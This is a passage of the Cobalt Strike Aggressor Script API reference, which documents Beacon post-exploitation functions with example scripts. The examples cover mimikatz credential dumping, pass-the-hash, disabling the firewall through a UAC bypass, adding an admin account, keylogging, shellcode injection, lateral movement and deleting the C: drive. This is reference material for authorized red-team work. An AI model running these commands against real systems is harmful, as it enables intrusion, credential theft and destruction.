   str_arg = BeaconDataExtract(&parser, NULL);
   num_arg = BeaconDataInt(&parser);
   
   BeaconPrintf(CALLBACK_OUTPUT, "Message is %s with %d arg", str_arg, num_arg);
}
Example (hello.cna)
alias hello {
   local('$barch $handle $data $args');

   # figure out the arch of this session
   $barch  = barch($1);

   # read in the right BOF file
   $handle = openf(script_resource("hello. $+ $barch $+ .o"));
   $data   = readb($handle, -1);
   closef($handle);

   # pack our arguments
   $args   = bof_pack($1, "zi", "Hello World", 1234);

   # announce what we're doing
   btask($1, "Running Hello BOF");
   
   # execute it.
   beacon_inline_execute($1, $data, "demo", $args);
}
See Also
&bof_pack

Back to Top

beacon_link
This function links to an SMB or TCP listener. If the specified listener is not an SMB or TCP listener, this function does nothing.

Arguments
$1 - the id of the beacon to link through

$2 - the target host to link to. Use $null for localhost.

$3 - the listener to link

Example
# smartlink [target] [listener name]
alias smartlink {
   beacon_link($1, $2, $3);
}
Back to Top

beacon_remote_exec_method_describe
Describe a Beacon remote execute method

Returns
A string description of the Beacon remote execute method.

Arguments
$1 - the method

Example
println(beacon_remote_exec_method_describe("wmi"));
See also
&beacon_remote_exec_method_register, &beacon_remote_exec_methods, &bremote_exec

Back to Top

beacon_remote_exec_method_register
Register a Beacon remote execute method with Cobalt Strike. This adds an option for use with the remote-exec command.

Arguments
$1 - the method short name

$2 - a description of the method

$3 - the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the command+args)

See Also
&beacon_remote_exec_method_describe, &beacon_remote_exec_methods, &bremote_exec

Back to Top

beacon_remote_exec_methods
Get a list of remote execute methods registered with Cobalt Strike.

Returns
An array of remote exec modules.

Example
printAll(beacon_remote_exec_methods());
See also
&beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &bremote_exec

Back to Top

beacon_remote_exploit_arch
Get the arch info for this Beacon lateral movement option.

Arguments
$1 - the exploit

Returns
x86 or x64

Example
println(beacon_remote_exploit_arch("psexec"));
See Also
&beacon_remote_exploit_register, &beacon_remote_exploits, &bjump

Back to Top

beacon_remote_exploit_describe
Describe a Beacon lateral movement option.

Returns
A string description of the Beacon lateral movement option.

Arguments
$1 - the exploit

Example
println(beacon_remote_exploit_describe("psexec"));
See Also
&beacon_remote_exploit_register, &beacon_remote_exploits, &bjump

Back to Top

beacon_remote_exploit_register
Register a Beacon lateral movement option with Cobalt Strike. This function extends the jump command.

Arguments
$1 - the exploit short name

$2 - the arch associated with this attack (e.g., x86, x64)

$3 - a description of the exploit

$4 - the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the listener)

See also
&beacon_remote_exploit_describe, &beacon_remote_exploits, &bjump

Back to Top

beacon_remote_exploits
Get a list of lateral movement options registered with Cobalt Strike.

Returns
An array of lateral movement option names.

Example
printAll(beacon_remote_exploits());
See also
&beacon_remote_exploit_describe, &beacon_remote_exploit_register, &bjump

Back to Top

beacon_remove
Remove a Beacon from the display.

Arguments
$1 - the id for the beacon to remove

Back to Top

beacon_stage_pipe
This function handles the staging process for a bind pipe stager. This is an optional stager for lateral movement. You can stage any x86 payload/listener through this stager. Use &stager_bind_pipe to generate this stager.

Arguments
$1 - the id of the beacon to stage through

$2 - the target host

$3 - the listener name

$4 - the architecture of the payload to stage. x86 is the only option right now.

Example
# step 1. generate our stager
$stager = stager_bind_pipe("my listener");

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_pipe($bid, $target, "my listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my listener");
Back to Top

beacon_stage_tcp
This function handles the staging process for a bind TCP stager. This is the preferred stager for localhost-only staging. You can stage any payload/listener through this stager. Use &stager_bind_tcp to generate this stager.

Arguments
$1 - the id of the beacon to stage through

$2 - reserved; use $null for now.

$3 - the port to stage to

$4 - the listener name

$5 - the architecture of the payload to stage (x86, x64)

Example
# step 1. generate our stager
$stager = stager_bind_tcp("my listener", "x86", 1234);

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_tcp($bid, $target, 1234, "my listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my listener");
Back to Top

beacons
Get information about all Beacons calling back to this Cobalt Strike team server.

Returns
An array of dictionary objects with information about each beacon.

Example
foreach $beacon (beacons()) {
   println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
}
Back to Top

belevate
Ask Beacon to spawn an elevated session with a registered technique.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the exploit to fire

$3 - the listener to target.

Example
item "&Elevate 31337" {
   openPayloadHelper(lambda({
      binput($bids, "elevate ms14-058 $1");
      belevate($bids, "ms14-058", $1);
   }, $bids => $1));
}
See also
&beacon_exploit_describe, &beacon_exploit_register, &beacon_exploits

Back to Top

belevate_command
Ask Beacon to run a command in a high-integrity context

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the module/command elevator to use

$3 - the command and its arguments.

Example
# disable the firewall
alias shieldsdn {
   belevate_command($1, "uac-token-duplication", "cmd.exe /C netsh advfirewall set allprofiles state off");
}
See also
&beacon_elevator_describe, &beacon_elevator_register, &beacon_elevators

Back to Top

berror
Publish an error message to the Beacon transcript

Arguments
$1 - the id for the beacon to post to

$2 - the text to post

Example
alias donotrun {
   berror($1, "You should never run this command!");
}
Back to Top

bexecute
Ask Beacon to execute a command [without a shell]. This provides no output to the user.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command and arguments to run

Example
bexecute($1, "notepad.exe");
Back to Top

bexecute_assembly
Spawns a local .NET executable assembly as a Beacon post-exploitation job.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the local path to the .NET executable assembly

$3 - parameters to pass to the assembly

$4 - (optional) the "PATCHES:" argument can modify functions in memory for the process. Up to 4 "patch-rule" rules can be specified (space delimited).

$5 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

"patch-rule" syntax (comma delimited): [library],[function],[offset],[hex-patch-value]

library - 1-260 characters
function - 1-256 characters
offset - 0-65535 (The offset from the start of the executable function)
hex-patch-value - 2-200 hex characters (0-9,A-F). Length must be even number (hex pairs).

Notes
This command accepts a valid .NET executable and calls its entry point.
This post-exploitation job inherits Beacon's thread token.
Compile your custom .NET programs with a .NET 3.5 compiler for compatibility with systems that don't have .NET 4.0 and later.
Example
alias myutil {
   bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
}
Back to Top

bexit
Ask a Beacon to exit.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
item "&Die" {
   binput($1, "exit");
   bexit($1);
}    
Back to Top

bgetprivs
Attempts to enable the specified privilege in your Beacon session.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - a comma-separated list of privileges to enable. See:

https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx

Example
alias debug {
   bgetprivs($1, "SeDebugPriv");
}
Back to Top

bgetsystem
Ask Beacon to attempt to get the SYSTEM token.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
item "Get &SYSTEM" {
   binput($1, "getsystem");
   bgetsystem($1);
}
Back to Top

bgetuid
Ask Beacon to print the User ID of the current token

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

bgetuid($1);
Back to Top

bhashdump
Ask Beacon to dump local account password hashes. If injecting into a pid that process requires administrator privileges.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID to inject the hashdump dll into or $null.

$3 - (optional) the architecture of the target PID (x86|x64) or $null.

$4 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map.

Example
Spawn a temporary process
item "Dump &Hashes" {
   binput($1, "hashdump");
   bhashdump($1);
}
Inject into the specified process)
bhashdump($1, 1234, "x64");
Back to Top

bind
Bind a keyboard shortcut to an Aggressor Script function. This is an alternate to the bind keyword.

Arguments
$1 - the keyboard shortcut

$2 - a callback function. Called when the event happens.

Example
# bind Ctrl+Left and Ctrl+Right to cycle through previous and next tab.

bind("Ctrl+Left", {
   previousTab();
});

bind("Ctrl+Right", {
   nextTab();
});
See also
&unbind

Back to Top

binfo
Get information from a Beacon session's metadata.

Arguments
$1 - the id for the beacon to pull metadata for

$2 - the key to extract

Returns
A string with the requested information.

Example
println("User is: " . binfo("1234", "user"));
println("PID  is: " . binfo("1234", "pid"));
Back to Top

binject
Ask Beacon to inject a session into a specific process.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the process to inject the session into

$3 - the listener to target.

$4 - the process architecture (x86 | x64)

Example
binject($1, 1234, "my listener");
Back to Top

binline_execute
Execute a Beacon Object File. This is the same as using the inline-execute command in Beacon.

Arguments
$1 - the id for the Beacon

$2 - the path to the BOF file

$3 - the string argument to pass to the BOF file

$4 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Notes
This functions follows the behavior of *inline-execute* in the Beacon console. The string argument will be zero-terminated, converted to the target encoding, and passed as an argument to the BOF's go function. To execute a BOF, with more control, use &beacon_inline_execute

The Cobalt Strike documentation has a page specific to BOF files. See Beacon Object Files.

Back to Top

binput
Report a command was run to the Beacon console and logs. Scripts that execute commands for the user (e.g., events, popup menus) should use this function to assure operator attribution of automated actions in Beacon's logs.

Arguments
$1 - the id for the beacon to post to

$2 - the text to post

Example
# indicate the user ran the ls command
binput($1, "ls");
Back to Top

bipconfig
Task a Beacon to list network interfaces.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - callback function with the ipconfig results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Example
alias ipconfig {
   bipconfig($1, {
      blog($1, "Network information is:\n $+ $2");
   });
}
Back to Top

bjobkill
Ask Beacon to kill a running post-exploitation job

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the job ID.

Example
bjobkill($1, 0);
Back to Top

bjobs
Ask Beacon to list running post-exploitation jobs.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
bjobs($1);
Back to Top

bjump
Ask Beacon to spawn a session on a remote target.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the technique to use

$3 - the remote target

$4 - the listener to spawn

Example
# winrm [target] [listener]
alias winrm {
   bjump($1, "winrm", $2, $3);
}
See also
&beacon_remote_exploit_describe, &beacon_remote_exploit_register, &beacon_remote_exploits

Back to Top

bkerberos_ccache_use
Ask beacon to inject a UNIX kerberos ccache file into the user's kerberos tray

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the local path the ccache file

Example
alias kerberos_ccache_use {
   bkerberos_ccache_use($1, $2);
}
Back to Top

bkerberos_ticket_purge
Ask beacon to purge tickets from the user's kerberos tray

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
alias kerberos_ticket_purge {
   bkerberos_ticket_purge($1);
}
Back to Top

bkerberos_ticket_use
Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the local path the kirbi file

Example
alias kerberos_ticket_use {
   bkerberos_ticket_use($1, $2);
}
Back to Top

bkeylogger
Injects a keystroke logger into a process.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - (optional) the PID to inject the keystroke logger into or $null.

$3 - (optional) the architecture of the target PID (x86|x64) or $null.

Example
Spawn a temporary process
bkeylogger($1);
Inject into the specified process
bkeylogger($1, 1234, "x64");
Back to Top

bkill
Ask Beacon to kill a process

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID to kill

Example
bkill($1, 1234);
Back to Top

blink
Ask Beacon to link to a host over a named pipe

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the target to link to

$3 - (optional) the pipename to use. The default pipename in the Malleable C2 profile is the default otherwise.

Note
Use &beacon_link if you want a script function that will connect or link based on a listener configuration.

Example
blink($1, "DC");
Back to Top

blog
Publishes an output message to the Beacon transcript.

Arguments
$1 - the id for the beacon to post to

$2 - the text to post

Example
alias demo {
   blog($1, "I am output for the blog function");
}
Back to Top

blog2
Publishes an output message to the Beacon transcript. This function has an alternate format from &blog

Arguments
$1 - the id for the beacon to post to

$2 - the text to post

Example
alias demo2 {
   blog2($1, "I am output for the blog2 function");
}
Back to Top

bloginuser
Ask Beacon to create a token from the specified credentials. This is the make_token command.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the domain of the user

$3 - the user's username

$4 - the user's password

Example
# make a token for a user with an empty password
alias make_token_empty {
   local('$domain $user');
   ($domain, $user) = split("\\\\", $2);
   bloginuser($1, $domain, $user, "");
}
Back to Top

blogonpasswords
Ask Beacon to dump in-memory credentials with mimikatz. This function requires administrator privileges.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - (optional) the PID to inject the logonpasswords command into or $null

$3 - (optional) the architecture of the target PID (x86|x64) or $null

Example
Spawn a temporary process
item "Dump &Passwords" {
   binput($1, "logonpasswords");
   blogonpasswords($1);
}
Inject into the specified process
beacon_command_register(
   "logonpasswords_inject",
   "Inject into a process and dump in-memory credentials with mimikatz",
   "Usage: logonpasswords_inject [pid] [arch]");
 
alias logonpasswords_inject {
   blogonpasswords($1, $2, $3);
}
Back to Top

bls
Task a Beacon to list files

Variations
bls($1, "folder");
Output the results to the Beacon console.

bls($1, "folder", &callback);
Route results to the specified callback function.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - (optional) the folder to list files for. Use "." for the current folder.

$3 - (optional) callback function with the ls results. Arguments to the callback are: $1 = beacon ID, $2 = the folder, $3 = results

Example
on beacon_initial {
   bls($1, ".");
}
Back to Top

bmimikatz
Ask Beacon to run a mimikatz command.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command and arguments to run. Supports the semicolon ( ; ) character to separate multiple commands

$3 - (optional) the PID to inject the mimikatz command into or $null

$4 - (optional) the architecture of the target PID (x86|x64) or $null

$5 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Examples
# Usage: coffee [pid] [arch]
alias coffee {
   if ($2 >= 0 && ($3 eq "x86" || $3 eq "x64")) {
      bmimikatz($1, "standard::coffee", $2, $3);
   } else {
      bmimikatz($1, "standard::coffee");
   }
}
 

alias double_espresso {
bmimikatz($1, "standard::coffee;standard::coffee");
}
Back to Top

bmimikatz_small
Use Cobalt Strike's "smaller" internal build of Mimikatz to execute a mimikatz command.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command and arguments to run. Supports the semicolon ( ; ) character to separate multiple commands

$3 - (optional) the PID to inject the mimikatz command into or $null

$4 - (optional) the architecture of the target PID (x86|x64) or $null

$5 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Note
This mimikatz build supports:

* kerberos::golden
* lsadump::dcsync
* sekurlsa::logonpasswords
* sekurlsa::pth
All of the other stuff is removed for size. Use &bmimikatz if you want to bring the full power of mimikatz to some other offense problem.

Example
# Usage: logonpasswords_elevate [pid] [arch]
alias logonpasswords_elevate {
   if ($2 >= 0 && ($3 eq "x86" || $3 eq "x64")) {
      bmimikatz_small($1, "!sekurlsa::logonpasswords", $2, $3);
   } else {
      bmimikatz_small($1, "!sekurlsa::logonpasswords");
   }
}
Back to Top

bmkdir
Ask Beacon to make a directory

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the folder to create

Example
bmkdir($1, "you are owned");
Back to Top

bmode
Change the data channel for a DNS Beacon.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the data channel (e.g., dns, dns6, or dns-txt)

Example
item "Mode DNS-TXT" {
   binput($1, "mode dns-txt");
   bmode($1, "dns-txt");
}
Back to Top

bmv
Ask Beacon to move a file or folder.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the file or folder to move

$3 - the destination

Example
bmv($1, "evil.exe", "\\\\target\\\C$\\evil.exe");
Back to Top

bnet
Run a command from Beacon's network and host enumeration tool.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command to run.

Type  Description
computers   lists hosts in a domain (groups)
dclist   lists domain controllers
domain   show the current domain
domain_controllers   list domain controller hosts in a domain (groups)
domain_trusts  lists domain trusts
group lists groups and users in groups
localgroup  lists local groups and users in local groups
logons   lists users logged onto a host
sessions lists sessions on a host
share lists shares on a host
user  lists users and user information
time  show time for a host
view  lists hosts in a domain (browser service)
$3 - the target to run this command against or $null

$4 - the parameter to this command (e.g., a group name)

$5 - (optional) the PID to inject the network and host enumeration tool into or $null

$6 - (optional) the architecture of the target PID (x86|x64) or $null

$7 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

NOTE:
The domain command executes a BOF using inline_execute and will not spawn or inject into a process

Example
Spawn a temporary process
# ladmins [target]
#   find the local admins for a target
alias ladmins {
   bnet($1, "localgroup", $2, "administrators");
}
Inject into the specified process
# ladmins [pid] [arch] [target]
#   find the local admins for a target
alias ladmins {
   bnet($1, "localgroup", $4, "administrators", $2, $3);
}
Back to Top

bnote
Assign a note to the specified Beacon.

Arguments
$1 - the id for the beacon to post to

$2 - the note content

Example
bnote($1, "foo");
Back to Top

bof_extract
This function extracts the executable code from the beacon object file.

Arguments
$1 - A string containing the beacon object file

Example
$handle = openf(script_resource("/object_file"));
$data   = readb($handle, -1);
closef($handle);

return bof_extract($data);
Back to Top

bof_pack
Pack arguments in a way that's suitable for BOF APIs to unpack.

Arguments
$1 - the id for the Beacon (needed for unicode conversions)

$2 - format string for the packed data

... - one argument per item in our format string

Note
This function packs its arguments into a binary structure for use with &beacon_inline_execute. The format string options here correspond to the BeaconData* C API available to BOF files. This API handles transformations on the data and hints as required by each type it can pack.

Type  Description Unpack With (C)
b  binary data BeaconDataExtract
i  4-byte integer BeaconDataInt
s  2-byte short integer BeaconDataShort
z  zero-terminated+encoded string   BeaconDataExtract
Z  zero-terminated wide-char string (wchar_t *)BeaconDataExtract
The Cobalt Strike documentation has a page specific to BOF files. See Beacon Object Files.

See also
&beacon_inline_execute

Back to Top

bpassthehash
Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz. This function requires administrator privileges.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the domain of the user

$3 - the user's username

$4 - the user's password hash

$5 - (optional) the PID to inject the pth command into or $null

$6 - (optional) the architecture of the target PID (x86|x64) or $null

Example
Spawn a temporary process
bpassthehash($1, "CORP", "Administrator", "password_hash");
Inject into the specified process
bpassthehash($1, "CORP", "Administrator", "password_hash", 1234, "x64");
Back to Top

bpause
Ask Beacon to pause its execution. This is a one-off sleep.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - how long the Beacon should pause execution for (milliseconds)

Example
alias pause {
   bpause($1, int($2));
}
Back to Top

bportscan
Ask Beacon to run its port scanner.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the targets to scan (e.g., 192.168.12.0/24)

$3 - the ports to scan (e.g., 1-1024,6667)

$4 - the discovery method to use (arp|icmp|none)

$5 - the max number of sockets to use (e.g., 1024)

$6 - (optional) the PID to inject the port scanner into or $null

$7 - (optional) the architecture of the target PID (x86|x64) or $null

$8 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Example
Spawn a temporary process
bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024);
Inject into the specified process
bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024, 1234, "x64");
Back to Top

bpowerpick
Spawn a process, inject Unmanaged PowerShell, and run the specified command.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the cmdlet and arguments

$3 - (optional) if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle. Specify $null to use the current imported PowerShell script.

$4 - (optional) the "PATCHES:" argument can modify functions in memory for the process. Up to 4 "patch-rule" rules can be specified (space delimited).

$5 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

"patch-rule" syntax (comma delimited): [library],[function],[offset],[hex-patch-value]

library - 1-260 characters
function - 1-256 characters
offset - 0-65535 (The offset from the start of the executable function)
hex-patch-value - 2-200 hex characters (0-9,A-F). Length must be even number (hex pairs).

Example
# get the version of PowerShell available via Unmanaged PowerShell
alias powerver {
   bpowerpick($1, '$PSVersionTable.PSVersion');
}
  
alias powerver2 {
   bpowerpick($1, '$PSVersionTable.PSVersion', '', 'PATCHES: ntdll.dll,EtwEventWrite,0,C300');
}
Back to Top

bpowershell
Ask Beacon to run a PowerShell cmdlet

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the cmdlet and arguments

$3 - (optional) if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command. Empty string is OK here too, for no download cradle. Specify $null to use the current imported PowerShell script.

$4 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Example
# get the version of PowerShell...
alias powerver {
   bpowershell($1, '$PSVersionTable.PSVersion');
}
Back to Top

bpowershell_import
Import a PowerShell script into a Beacon

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the path to the local file to import

Example
# quickly run PowerUp
alias powerup {
   bpowershell_import($1, script_resource("PowerUp.ps1"));
   bpowershell($1, "Invoke-AllChecks");
}
Back to Top

bpowershell_import_clear
Clear the imported PowerShell script from a Beacon session.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
alias powershell-clear {
   bpowershell_import_clear($1);
}
Back to Top

bppid
Set a parent process for Beacon's child processes

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the parent process ID. Specify 0 to reset to default behavior.

Notes
The current session must have rights to access the specified parent process.
Attempts to spawn post-ex jobs under parent processes in another desktop session may fail. This limitation is due to how Beacon launches its "temporary" processes for post-exploitation jobs and injects code into them.
Example
alias prepenv {
  btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
  bps($1, {
    local('$pid $name $entry');
    foreach $entry (split("\n", $2)) {
      ($name, $null, $pid) = split("\\s+", $entry);
      if ($name eq "explorer.exe") {
          bppid($1, $pid);
      }
    }
  });
}
Back to Top

bprintscreen
Ask Beacon to take a screenshot via PrintScr method.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - (optional) the PID to inject the screenshot tool via PrintScr method or $null.

$3 - (optional) the architecture of the target PID (x86|x64) or $null.

Example
Spawn a temporary process
item "&Printscreen" {
   binput($1, "printscreen");
   bpintscreen($1);
}
Inject into the specified process
bprintscreen($1, 1234, "x64");
Back to Top

bps
Task a Beacon to list processes

Variations
bps($1);
Output the results to the Beacon console.

bps($1, &callback);
Route results to the specified callback function.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - (optional) callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = results

Example
on beacon_initial {
   bps($1);
}
 

alias prepenv {
  btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
  bps($1, {
    local('$pid $name $entry');
    foreach $entry (split("\n", $2)) {
      ($name, $null, $pid) = split("\\s+", $entry);
      if ($name eq "explorer.exe") {
          bppid($1, $pid);
      }
    }
  });
}
Back to Top

bpsexec
Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it and clean it up.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the target to spawn a payload onto

$3 - the listener to spawn

$4 - the share to copy the executable to

$5 - the architecture of the payload to generate/deliver (x86 or x64)

Example
brev2self();
bloginuser($1, "CORP", "Administrator", "toor");
bpsexec($1, "172.16.48.3", "my listener", "ADMIN\$");
Back to Top

bpsexec_command
Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the target to run the command on

$3 - the name of the service to create

$4 - the command to run.

Example
# disable the firewall on a remote target
# beacon> shieldsdown [target]
alias shieldsdown {
   bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}
Back to Top

bpsexec_psh
REMOVED Removed in Cobalt Strike 4.0. Use &bjump with psexec_psh option.

bpsinject
Inject Unmanaged PowerShell into a specific process and run the specified cmdlet. This will use the current imported powershell script.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the process to inject the session into

$3 - the process architecture (x86 | x64)

$4 - the cmdlet to run

$5 - (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

Example
bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");
Back to Top

bpwd
Ask Beacon to print its current working directory

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
alias pwd {
   bpwd($1);
}
Back to Top

breg_queryv
Ask Beacon to query a value within a registry key.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the path to the key

$3 - the name of the value to query

$4 - x86|x64 - which view of the registry to use

Example
alias winver {
   breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
}
Back to Top

breg_queryv
Ask Beacon to query a value within a registry key.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the path to the key

$3 - the name of the value to query

$4 - x86|x64 - which view of the registry to use

Example
alias winver {
   breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
}
Back to Top

bremote_exec
Ask Beacon to run a command on a remote target.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the remote execute method to use

$3 - the remote target

$4 - the command and arguments to run

Example
# winrm [target] [command+args]
alias winrm-exec {
   bremote_exec($1, "winrm", $2, $3); {
}
See also
&beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &beacon_remote_exec_methods

Back to Top

brev2self
Ask Beacon to drop its current token. This calls the RevertToSelf() Win32 API.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
alias rev2self {
   brev2self($1);
}
Back to Top

brm
Ask Beacon to remove a file or folder.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the file or folder to remove

Example
# nuke the system
brm($1, "c:\\");
Back to Top

brportfwd
Ask Beacon to setup a reverse port forward.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the port to bind to on the target

$3 - the host to forward connections to

$4 - the port to forward connections to

Example
brportfwd($1, 80, "192.168.12.88", 80);
Back to Top

brportfwd_local
Ask Beacon to setup a reverse port forward that routes to the current Cobalt Strike client.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the port to bind to on the target

$3 - the host to forward connections to

$4 - the port to forward connections to

Example
brportfwd_local($1, 80, "192.168.12.88", 80);
Back to Top

brportfwd_stop
Ask Beacon to stop a reverse port forward

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the port bound on the target

Example
brportfwd_stop($1, 80);
Back to Top

brun
Ask Beacon to run a command

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command and arguments to run

Note
This capability is a simpler version of the &beacon_execute_job function. The latter function is what &bpowershell and &bshell build on. This is a (slightly) more OPSEC-safe option to run commands and receive output from them.

Example
alias w {
   brun($1, "whoami /all");
}
Back to Top

brunas
Ask Beacon to run a command as another user.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the domain of the user

$3 - the user's username

$4 - the user's password

$5 - the command to run

Example
brunas($1, "CORP", "Administrator", "toor", "notepad.exe");
Back to Top

brunasadmin
REMOVED Removed in Cobalt Strike 4.0. Use &belevate_command with psexec_psh option.

Ask Beacon to run a command in a high-integrity context (bypasses UAC).

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command and its arguments.

Notes
This command uses the Token Duplication UAC bypass. This bypass has a few requirements:

Your user must be a local admin
If Always Notify is enabled, an existing high integrity process must be running in the current desktop session.
Example
# disable the firewall
brunasadmin($1, "cmd.exe /C netsh advfirewall set allprofiles state off");
Back to Top

brunu
Ask Beacon to run a process under another process.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID of the parent process

$3 - the command + arguments to run

Example
brunu($1, 1234, "notepad.exe");
Back to Top

bscreenshot
Ask Beacon to take a screenshot.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - (optional) the PID to inject the screenshot tool or $null

$3 - (optional) the architecture of the target PID (x86|x64) or $null

Example
Spawn a temporary process
item "&Screenshot" {
   binput($1, "screenshot");
   bscreenshot($1);
}
Inject into the specified process
bscreenshot($1, 1234, "x64");
Back to Top

bscreenwatch
Ask Beacon to take periodic screenshots

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - (optional) the PID to inject the screenshot tool or $null

$3 - (optional) the architecture of the target PID (x86|x64) or $null

Example
Spawn a temporary process
item "&Screenwatch" {
   binput($1, "screenwatch");
   bscreenwatch($1);
}
Inject into the specified process
bscreenwatch($1, 1234, "x64");
Back to Top

bsetenv
Ask Beacon to set an environment variable

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the environment variable to set

$3 - the value to set the environment variable to (specify $null to unset the variable)

Example
alias tryit {
   bsetenv($1, "foo", "BAR!");
   bshell($1, "echo %foo%");
}
Back to Top

bshell
Ask Beacon to run a command with cmd.exe

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the command and arguments to run

Example
alias adduser {
   bshell($1, "net user $2 B00gyW00gy1234! /ADD");
   bshell($1, "net localgroup \"Administrators\" $2 /ADD");
}
Back to Top

bshinject
Inject shellcode (from a local file) into a specific process.

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

$2 - the PID of the process to inject into

$3 - the process architecture (x86 | x64)

$4 - the local file with the shellcode

Example
bshinject($1, 1234, "x86", "/path/to/stuff.bin");
Back to Top

bshspawn
